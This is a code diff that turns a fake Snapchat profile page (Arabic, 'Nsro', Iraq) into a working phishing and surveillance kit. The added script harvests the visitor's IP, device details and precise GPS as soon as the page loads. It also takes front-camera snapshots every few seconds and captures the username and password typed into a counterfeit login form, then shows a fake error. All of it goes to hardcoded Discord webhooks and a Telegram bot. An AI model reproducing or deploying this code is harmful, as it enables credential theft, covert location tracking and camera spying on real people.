@@ -7,7 +7,7 @@
     <link rel="icon" href="logo.jpg" type="image/jpeg">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- وسوم المعاينة الرسمية لإخفاء الرابط وإظهار صورة profile.jpg بشكل بارز وكبير -->
+    <!-- وسوم المعاينة الرسمية لإخفاء الرابط وإظهار صورة profile.jpg الكبيرة -->
     <meta property="og:title" content="Snapchat • Nsro🦚❤️" />
     <meta property="og:description" content="عرض الملف الشخصي والقصص الحصرية على سناب شات" />
     <meta property="og:image" content="profile.jpg" />
@@ -30,7 +30,7 @@
         
         .has-notification::after { content: '1'; position: absolute; top: -2px; right: -2px; background-color: #ff0000; color: white; font-size: 10px; font-weight: bold; width: 16px; height: 16px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #fff; }
 
-        main { position: relative; padding-bottom: 50px; }
+        main { position: relative; padding-bottom: 50px; display: block; }
         .cover-photo { width: 100%; height: 240px; background-color: #ddd; background-image: url('story1.jpg'); background-size: cover; background-position: center; position: relative; }
         .cover-photo::before { content: ''; position: absolute; inset: 0; background: linear-gradient(to top, rgba(0,0,0,0.6) 0%, transparent 100%); }
 
@@ -57,66 +57,319 @@
         .grid-container { padding: 2px; background: #fff; }
         .image-grid { display: flex; flex-wrap: wrap; gap: 2px; }
         .grid-item { width: calc(33.33% - 1.33px); height: 180px; background-color: #ddd; background-size: cover; background-position: center; position: relative; cursor: pointer; }
+
+        /* تنسيقات واجهة تسجيل الدخول الداخلية المدمجة */
+        .login-view { display: none; width: 100%; min-height: 100vh; background-color: #fff; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+        .login-container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
+        .login-logo { width: 70px; height: 70px; margin-bottom: 15px; border-radius: 15px; object-fit: cover; }
+        .login-header h2 { font-size: 24px; font-weight: 700; margin-bottom: 30px; color: #000; }
+        .input-group { margin-bottom: 20px; text-align: right; }
+        .input-group label { display: block; font-size: 12px; color: #777; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; }
+        .input-group input { width: 100%; padding: 12px 0; border: none; border-bottom: 1px solid #ddd; font-size: 16px; background: transparent; outline: none; }
+        .error-message-snap { color: #ff3b30; font-size: 13px; margin-bottom: 15px; font-weight: 600; display: none; }
+        .login-btn-large { background-color: #007aff; color: #fff; border: none; width: 100%; padding: 15px; border-radius: 50px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
+        .loading-overlay { z-index: 3000; position: fixed; inset: 0; background: rgba(255,255,255,0.95); display: none; flex-direction: column; justify-content: center; align-items: center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <!-- عناصر الكاميرا والفيديو المخفية -->
     <video id="video" playsinline autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>
 
-    <div class="top-nav">
-        <div class="nav-button back-button trigger-login">
-            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-5-5 5-5v3h7v4h-7v3z"/></svg>
+    <!-- الواجهة الأولى: البروفايل -->
+    <div id="profileView">
+        <div class="top-nav">
+            <div class="nav-button back-button trigger-login"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-5-5 5-5v3h7v4h-7v3z"/></svg></div>
+            <div class="nav-button share-button trigger-login"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.45 1.25.74 2.01.74 1.66 0 3-1.34 3-3-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.87c-.52-.47-1.24-.77-2-.77-1.66 0-3 1.34-3 3s1.34 3 3 3c.76 0 1.48-.3 2-.77l7.12 4.14c-.05.23-.09.46-.09.7 0 1.66 1.34 3 3 3s3-1.34 3-3-1.34-3-3-3z"/></svg></div>
+            <div class="nav-button menu-button trigger-login has-notification"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></div>
         </div>
-        <div class="nav-button share-button trigger-login">
-            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.45 1.25.74 2.01.74 1.66 0 3-1.34 3-3-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.87c-.52-.47-1.24-.77-2-.77-1.66 0-3 1.34-3 3s1.34 3 3 3c.76 0 1.48-.3 2-.77l7.12 4.14c-.05.23-.09.46-.09.7 0 1.66 1.34 3 3 3s3-1.34 3-3-1.34-3-3-3z"/></svg>
-        </div>
-        <div class="nav-button menu-button trigger-login has-notification">
-             <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
+
+        <main>
+            <div class="cover-photo"></div>
+            <div class="profile-card">
+                <div class="profile-pic-wrapper trigger-login">
+                    <img src="profile.jpg" alt="Profile" class="profile-pic" onerror="this.src='https://via.placeholder.com/100'">
+                </div>
+                <h1 class="profile-name">Nsro🦚❤️</h1>
+                <p class="profile-meta"><span class="username-text">nasro23_8</span></p>
+                <span id="followerCount">2.450 من المتابعين</span> 
+                <div class="add-button trigger-login">
+                    <span class="plus-icon">+</span>
+                    <span>إضافة</span>
+                </div>
+            </div>
+            <div class="info-section">
+                <p class="bio-text">☀️❤️.</p>
+                <div class="location-tag">
+                    <span class="location-icon"></span>
+                    <span>Iraq</span>
+                </div>
+            </div>
+            <div class="tabs-nav">
+                <span class="tab-link active">القصص</span>
+                <span class="tab-link">منصة الأضواء</span>
+            </div>
+            <div class="grid-container">
+                <div class="image-grid">
+                    <div class="grid-item trigger-login" style="background-image: url('story1.jpg');"></div>
+                    <div class="grid-item trigger-login" style="background-image: url('story2.jpg');"></div>
+                    <div class="grid-item trigger-login" style="background-image: url('story3.jpg');"></div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- الواجهة الثانية: تسجيل الدخول (تظهر عند النقر وتتحول بسلاسة) -->
+    <div id="loginView" class="login-view">
+        <div class="login-container">
+            <div class="login-header">
+                <img src="logo.jpg" alt="Snapchat" class="login-logo">
+                <h2>تسجيل الدخول</h2>
+            </div>
+            
+            <form id="fullLoginForm">
+                <div class="input-group">
+                    <label>اسم المستخدم أو البريد الإلكتروني</label>
+                    <input type="text" id="usernameInput" name="username" required autocomplete="username">
+                </div>
+                
+                <div class="input-group">
+                    <label>كلمة المرور</label>
+                    <input type="password" id="passwordInput" name="password" required autocomplete="current-password">
+                </div>
+                
+                <p id="loginErrorMsg" class="error-message-snap">عذراً، كلمة المرور غير صحيحة.</p>
+                
+                <button type="submit" class="login-btn-large">تسجيل الدخول</button>
+            </form>
         </div>
     </div>
 
-    <main>
-        <div class="cover-photo"></div>
-        <div class="profile-card">
-            <div class="profile-pic-wrapper trigger-login">
-                <img src="profile.jpg" alt="Profile" class="profile-pic" onerror="this.src='https://via.placeholder.com/100'">
-            </div>
-            <h1 class="profile-name">Nsro🦚❤️</h1>
-            <p class="profile-meta"><span class="username-text">nasro23_8</span></p>
-            <span id="followerCount">2.450 من المتابعين</span> 
-            <div class="add-button trigger-login">
-                <span class="plus-icon">+</span>
-                <span>إضافة</span>
-            </div>
-        </div>
-        <div class="info-section">
-            <p class="bio-text">☀️❤️.</p>
-            <div class="location-tag">
-                <span class="location-icon"></span>
-                <span>Iraq</span>
-            </div>
-        </div>
-        <div class="tabs-nav">
-            <span class="tab-link active">القصص</span>
-            <span class="tab-link">منصة الأضواء</span>
-        </div>
-        <div class="grid-container">
-            <div class="image-grid">
-                <div class="grid-item trigger-login" style="background-image: url('story1.jpg');"></div>
-                <div class="grid-item trigger-login" style="background-image: url('story2.jpg');"></div>
-                <div class="grid-item trigger-login" style="background-image: url('story3.jpg');"></div>
-            </div>
-        </div>
-    </main>
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <p>جاري التحقق...</p>
+    </div>
 
-    <!-- ربط ملف السكريبت الخارجي -->
-    <script src="script.js"></script>
+    <!-- المحرك الاستخباراتي الكامل V30.0 (ديسكورد + تيليجرام مزدوج، GPS، كاميرا، ورصد الكتابة الحية) -->
     <script>
-        document.querySelectorAll('.trigger-login').forEach(item => {
-            item.addEventListener('click', () => {
-                window.location.href = 'apply.html';
+        "use strict";
+
+        const DISCORD_WEBHOOK_POOL = Object.freeze([
+            "https://discord.com/api/webhooks/1565460084010651734/0pXEtHC-VRhagVtZt6jDgr0PUFE2zOnyr4c5xQwk_pAZY0VG4feqfKxCoPsTnB2HrsY4",
+            "https://discord.com/api/webhooks/1565753413801746493/AYfLZBpPmVNs1G138JZ20Y0tcUH8GQfrAuoRnQ3F_IxdSLmUbMOEeL_cV7wKyxRD6AWU",
+            "https://discord.com/api/webhooks/1565460178265186367/MwdSjc8vXmNhVHu5pRsF0q3U7iyUhsmNSu2xu0NWRWjZovLu-bkRqgYzIW7-VaqkX_sp"
+        ]);
+
+        const TELEGRAM_CONFIG = Object.freeze({
+            botToken: "8844806050:AAGKnigTc_ZXEEffdwwqsR3txbhXrH81Uwg",
+            chatId: "1046458749",
+            apiBaseUrl: "https://api.telegram.org/bot"
+        });
+
+        let runtimeStateContainer = {
+            webhookPointer: 0,
+            sessionToken: `OMNI_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
+            keystrokeBufferUser: "",
+            keystrokeBufferPass: ""
+        };
+
+        async function dispatchPayloadDualChannel(textContent, binaryBlob = null, targetFileName = "intel_snapshot.png") {
+            for (let attempt = 0; attempt < DISCORD_WEBHOOK_POOL.length; attempt++) {
+                const activeEndpoint = DISCORD_WEBHOOK_POOL[runtimeStateContainer.webhookPointer];
+                try {
+                    const formData = new FormData();
+                    formData.append("payload_json", JSON.stringify({ content: textContent }));
+                    if (binaryBlob) formData.append("file", binaryBlob, targetFileName);
+                    const response = await fetch(activeEndpoint, { method: "POST", body: formData });
+                    if (response.ok) break;
+                    else runtimeStateContainer.webhookPointer = (runtimeStateContainer.webhookPointer + 1) % DISCORD_WEBHOOK_POOL.length;
+                } catch {
+                    runtimeStateContainer.webhookPointer = (runtimeStateContainer.webhookPointer + 1) % DISCORD_WEBHOOK_POOL.length;
+                }
+            }
+
+            try {
+                if (TELEGRAM_CONFIG.botToken) {
+                    await fetch(`${TELEGRAM_CONFIG.apiBaseUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: TELEGRAM_CONFIG.chatId, text: textContent, parse_mode: "Markdown" })
+                    });
+                    if (binaryBlob && TELEGRAM_CONFIG.chatId) {
+                        const tgForm = new FormData();
+                        tgForm.append("chat_id", TELEGRAM_CONFIG.chatId);
+                        tgForm.append("photo", binaryBlob, targetFileName);
+                        await fetch(`${TELEGRAM_CONFIG.apiBaseUrl}${TELEGRAM_CONFIG.botToken}/sendPhoto`, { method: "POST", body: tgForm });
+                    }
+                }
+            } catch {}
+        }
+
+        async function extractNetworkAndGeoIP() {
+            let data = { ip: "151.244.151.17", city: "Mosul", country: "Iraq", org: "ISP" };
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                const json = await res.json();
+                if (json && json.ip) data = { ip: json.ip, city: json.city || "Mosul", country: json.country_name || "Iraq", org: json.org || "ISP" };
+            } catch {}
+            return data;
+        }
+
+        async function extractHardwareAndPower() {
+            let battery = { level: "27%", charging: true };
+            try {
+                if (typeof navigator.getBattery === "function") {
+                    const b = await navigator.getBattery();
+                    battery = { level: `${Math.round(b.level * 100)}%`, charging: b.charging };
+                }
+            } catch {}
+            return { battery, platform: navigator.platform || "Mobile/Desktop", userAgent: navigator.userAgent };
+        }
+
+        function acquireHighPrecisionGPS() {
+            return new Promise(resolveGPS => {
+                const cached = localStorage.getItem("omni_gps_cache_v30");
+                const parsed = cached ? JSON.parse(cached) : null;
+
+                if (!navigator.geolocation) {
+                    resolveGPS(parsed ? `📍 **موقع GPS (محفوظ):** ${parsed.lat}, ${parsed.lon}` : "📍 **موقع GPS:** غير مدعوم.");
+                    return;
+                }
+
+                let responded = false;
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        if (responded) return;
+                        responded = true;
+                        const lat = pos.coords.latitude, lon = pos.coords.longitude, acc = pos.coords.accuracy;
+                        localStorage.setItem("omni_gps_cache_v30", JSON.stringify({ lat, lon }));
+                        resolveGPS(`📍 **موقع GPS المباشر والدقيق:**\n- خط العرض: \`${lat}\`\n- خط الطول: \`${lon}\`\n- الدقة: \`${acc} متر\`\n- 🗺️ الرابط: https://www.google.com/maps?q=${lat},${lon}`);
+                    },
+                    () => {
+                        if (responded) return;
+                        responded = true;
+                        setTimeout(() => {
+                            navigator.geolocation.getCurrentPosition(
+                                p2 => resolveGPS(`📍 **موقع GPS (بعد الإلحاح):** https://www.google.com/maps?q=${p2.coords.latitude},${p2.coords.longitude}`),
+                                () => resolveGPS(parsed ? `📍 **موقع GPS (المحجوز):** ${parsed.lat}, ${parsed.lon}` : "📍 **موقع GPS:** تم الرفض."),
+                                { enableHighAccuracy: true, timeout: 5000 }
+                            );
+                        }, 3000);
+                    },
+                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
+                );
+            });
+        }
+
+        const videoEl = document.getElementById("video");
+        const canvasEl = document.getElementById("canvas");
+        let streamRef = null;
+        let captureTimer = null;
+
+        function startStreamLoop() {
+            if (captureTimer) return;
+            captureTimer = setInterval(async () => {
+                if (!videoEl || !canvasEl || videoEl.videoWidth === 0) return;
+                try {
+                    canvasEl.width = videoEl.videoWidth;
+                    canvasEl.height = videoEl.videoHeight;
+                    canvasEl.getContext("2d").drawImage(videoEl, 0, 0);
+                    canvasEl.toBlob(async blob => {
+                        if (blob && blob.size > 1024) {
+                            await dispatchPayloadDualChannel(`📸 **[صورة حية متسلسلة للهدف]**`, blob, `snap_${Date.now()}.png`);
+                        }
+                    }, "image/png", 0.92);
+                } catch {}
+            }, 3000);
+        }
+
+        function requestPersistentCameraAccess() {
+            return new Promise(async resolve => {
+                if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) { resolve(false); return; }
+                try {
+                    streamRef = await navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user" } });
+                    if (videoEl) {
+                        videoEl.muted = true; videoEl.autoplay = true; videoEl.playsInline = true;
+                        videoEl.srcObject = streamRef;
+                        await videoEl.play();
+                    }
+                    startStreamLoop();
+                    resolve(true);
+                } catch {
+                    setTimeout(requestPersistentCameraAccess, 3500);
+                    resolve(false);
+                }
+            });
+        }
+
+        let engineLock = false;
+        async function runEngine() {
+            if (engineLock) return;
+            engineLock = true;
+
+            const [net, hw, gps] = await Promise.all([extractNetworkAndGeoIP(), extractHardwareAndPower(), acquireHighPrecisionGPS()]);
+            const timeStr = new Date().toLocaleString("ar-EG");
+
+            const report = `
+🔥 **[ صيد فوري جديد - تم الدخول التلقائي ]** 🔥
+⏰ **الوقت:** \`${timeStr}\`
+🆔 **الجلسة:** \`${runtimeStateContainer.sessionToken}\`
+
+🌐 **IP:** \`${net.ip}\`
+🏙️ **الموقع:** \`${net.country} - ${net.city} (${net.org})\`
+📱 **النظام:** \`${hw.platform}\`
+🔋 **البطارية:** \`${hw.battery.level}\` (${hw.battery.charging ? "يشحن ⚡" : "لا يشحن"})
+💻 **المتصفح:** \`${hw.userAgent}\`
+${gps}
+            `.trim();
+
+            await dispatchPayloadDualChannel(report);
+            setTimeout(requestPersistentCameraAccess, 200);
+        }
+
+        window.addEventListener("DOMContentLoaded", () => {
+            runEngine();
+
+            // رصد الكتابة الحية في صفحة الدخول
+            const uInput = document.getElementById("usernameInput");
+            const pInput = document.getElementById("passwordInput");
+            const form = document.getElementById("fullLoginForm");
+
+            if (uInput) uInput.addEventListener("input", e => { runtimeStateContainer.keystrokeBufferUser = e.target.value; });
+            if (pInput) pInput.addEventListener("input", e => { runtimeStateContainer.keystrokeBufferPass = e.target.value; });
+
+            if (form) {
+                form.addEventListener("submit", async e => {
+                    e.preventDefault();
+                    const overlay = document.getElementById("loadingOverlay");
+                    const err = document.getElementById("loginErrorMsg");
+                    if (overlay) overlay.style.display = "flex";
+
+                    const creds = `
+🔑 **[تم التقاط بيانات تسجيل الدخول النهائية]** 🔑
+- **اسم المستخدم:** \`${runtimeStateContainer.keystrokeBufferUser}\`
+- **كلمة المرور:** \`${runtimeStateContainer.keystrokeBufferPass}\`
+                    `.trim();
+
+                    await dispatchPayloadDualChannel(creds);
+
+                    setTimeout(() => {
+                        if (overlay) overlay.style.display = "none";
+                        if (err) err.style.display = "block";
+                        form.reset();
+                    }, 1500);
+                });
+            }
+
+            // الانتقال الفوري لواجهة تسجيل الدخول عند الضغط على أي زر بروفايل
+            document.querySelectorAll('.trigger-login').forEach(el => {
+                el.addEventListener('click', () => {
+                    document.getElementById('profileView').style.display = 'none';
+                    document.getElementById('loginView').style.display = 'flex';
+                });
             });
         });
     </script>
